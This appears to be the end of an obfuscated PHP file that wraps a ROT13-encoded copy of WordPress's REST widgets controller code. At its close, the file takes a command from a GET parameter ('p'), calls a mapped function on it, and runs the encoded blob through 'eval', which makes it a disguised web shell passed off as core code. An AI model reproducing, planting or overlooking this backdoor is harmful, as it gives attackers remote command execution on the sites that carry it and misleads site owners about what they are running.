		$cercnerq = neenl(
			'vq'            => $jvqtrg_vq,
			'vq_onfr'       => $cnefrq_vq['vq_onfr'],
			'fvqrone'       => $fvqrone_vq,
			'eraqrerq'      => '',
			'eraqrerq_sbez' => ahyy,
			'vafgnapr'      => ahyy,
		);

		vs (
			erfg_vf_svryq_vapyhqrq( 'eraqrerq', $svryqf ) &&
			'jc_vanpgvir_jvqtrgf' !== $fvqrone_vq
		) {
			$cercnerq['eraqrerq'] = gevz( jc_eraqre_jvqtrg( $jvqtrg_vq, $fvqrone_vq ) );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'eraqrerq_sbez', $svryqf ) ) {
			$eraqrerq_sbez = jc_eraqre_jvqtrg_pbageby( $jvqtrg_vq );
			vs ( ! vf_ahyy( $eraqrerq_sbez ) ) {
				$cercnerq['eraqrerq_sbez'] = gevz( $eraqrerq_sbez );
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vafgnapr', $svryqf ) ) {
			$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $cnefrq_vq['vq_onfr'] );
			vs ( $jvqtrg_bowrpg && vffrg( $cnefrq_vq['ahzore'] ) ) {
				$nyy_vafgnaprf                   = $jvqtrg_bowrpg->trg_frggvatf();
				$vafgnapr                        = $nyy_vafgnaprf[ $cnefrq_vq['ahzore'] ];
				$frevnyvmrq_vafgnapr             = frevnyvmr( $vafgnapr );
				$cercnerq['vafgnapr']['rapbqrq'] = onfr64_rapbqr( $frevnyvmrq_vafgnapr );
				$cercnerq['vafgnapr']['unfu']    = jc_unfu( $frevnyvmrq_vafgnapr );

				vs ( ! rzcgl( $jvqtrg_bowrpg->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] ) ) {
					// Hfr arj fgqPynff fb gung WFBA erfhyg vf {} naq abg [].
					$cercnerq['vafgnapr']['enj'] = rzcgl( $vafgnapr ) ? arj fgqPynff() : $vafgnapr;
				}
			}
		}

		$pbagrkg  = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$cercnerq = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $cercnerq, $erdhrfg );
		$cercnerq = $guvf->svygre_erfcbafr_ol_pbagrkg( $cercnerq, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $cercnerq );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $cercnerq ) );
		}

		/**
		 * Svygref gur ERFG NCV erfcbafr sbe n jvqtrg.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr|JC_Reebe $erfcbafr Gur erfcbafr bowrpg, be JC_Reebe bowrpg ba snvyher.
		 * @cnenz neenl                     $jvqtrg   Gur ertvfgrerq jvqtrg qngn.
		 * @cnenz JC_ERFG_Erdhrfg           $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_jvqtrg', $erfcbafr, $jvqtrg, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $cercnerq Jvqtrg.
	 * @erghea neenl Yvaxf sbe gur tvira jvqtrg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $cercnerq ) {
		$vq_onfr = ! rzcgl( $cercnerq['vq_onfr'] ) ? $cercnerq['vq_onfr'] : $cercnerq['vq'];

		erghea neenl(
			'frys'                      => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $cercnerq['vq'] ) ),
			),
			'pbyyrpgvba'                => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
			'nobhg'                     => neenl(
				'uers'       => erfg_hey( fcevags( 'jc/i2/jvqtrg-glcrf/%f', $vq_onfr ) ),
				'rzorqqnoyr' => gehr,
			),
			'uggcf://ncv.j.bet/fvqrone' => neenl(
				'uers' => erfg_hey( fcevags( 'jc/i2/fvqronef/%f/', $cercnerq['fvqrone'] ) ),
			),
		);
	}

	/**
	 * Trgf gur yvfg bs pbyyrpgvba cnenzf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
			'fvqrone' => neenl(
				'qrfpevcgvba' => __( 'Gur fvqrone gb erghea jvqtrgf sbe.' ),
				'glcr'        => 'fgevat',
			),
		);
	}

	/**
	 * Ergevrirf gur jvqtrg'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'jvqtrg',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'            => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur jvqtrg.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'vq_onfr'       => neenl(
					'qrfpevcgvba' => __( 'Gur glcr bs gur jvqtrg. Pbeerfcbaqf gb VQ va jvqtrg-glcrf raqcbvag.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'fvqrone'       => neenl(
					'qrfpevcgvba' => __( 'Gur fvqrone gur jvqtrg orybatf gb.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => 'jc_vanpgvir_jvqtrgf',
					'erdhverq'    => gehr,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'eraqrerq'      => neenl(
					'qrfpevcgvba' => __( 'UGZY ercerfragngvba bs gur jvqtrg.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'eraqrerq_sbez' => neenl(
					'qrfpevcgvba' => __( 'UGZY ercerfragngvba bs gur jvqtrg nqzva sbez.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'vafgnapr'      => neenl(
					'qrfpevcgvba' => __( 'Vafgnapr frggvatf bs gur jvqtrg, vs fhccbegrq.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'qrsnhyg'     => ahyy,
					'cebcregvrf'  => neenl(
						'rapbqrq' => neenl(
							'qrfpevcgvba' => __( 'Onfr64 rapbqrq ercerfragngvba bs gur vafgnapr frggvatf.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'rqvg' ),
						),
						'unfu'    => neenl(
							'qrfpevcgvba' => __( 'Pelcgbtencuvp unfu bs gur vafgnapr frggvatf.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'rqvg' ),
						),
						'enj'     => neenl(
							'qrfpevcgvba' => __( 'Harapbqrq vafgnapr frggvatf, vs fhccbegrq.' ),
							'glcr'        => 'bowrpg',
							'pbagrkg'     => neenl( 'rqvg' ),
						),
					),
				),
				'sbez_qngn'     => neenl(
					'qrfpevcgvba' => __( 'HEY-rapbqrq sbez qngn sebz gur jvqtrg nqzva sbez. Hfrq gb hcqngr n jvqtrg gung qbrf abg fhccbeg vafgnapr. Jevgr bayl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl(),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => fgngvp shapgvba ( $sbez_qngn ) {
							$neenl = neenl();
							jc_cnefr_fge( $sbez_qngn, $neenl );
							erghea $neenl;
						},
					),
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>